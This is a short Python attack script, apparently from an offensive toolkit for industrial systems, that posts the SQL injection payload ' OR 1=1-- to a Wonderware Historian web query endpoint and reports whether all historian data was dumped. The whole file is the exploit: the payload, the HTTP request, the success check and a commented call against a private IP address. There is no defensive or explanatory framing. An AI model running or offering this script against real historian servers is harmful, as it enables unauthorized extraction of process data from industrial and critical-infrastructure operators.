def wonderware_historian_sqli(historian_server):
    """
    SQL injection in Wonderware Historian query interface
    """
    import requests

    # Historian web interface
    url = f"http://{historian_server}/historian/query"

    # Malicious SQL query
    # Normal query: SELECT * FROM History WHERE TagName='Temperature'
    # Injection: ' OR 1=1--

    payload = {
        "tagname": "' OR 1=1--",
        "starttime": "2024-01-01",
        "endtime": "2024-01-31"
    }

    response = requests.post(url, data=payload)

    if "History" in response.text:
        print("[+] SQL injection successful")
        print("[*] All historian data dumped")
        print(response.text[:500])
    else:
        print("[-] Injection failed or patched")

# wonderware_historian_sqli('192.168.1.100')
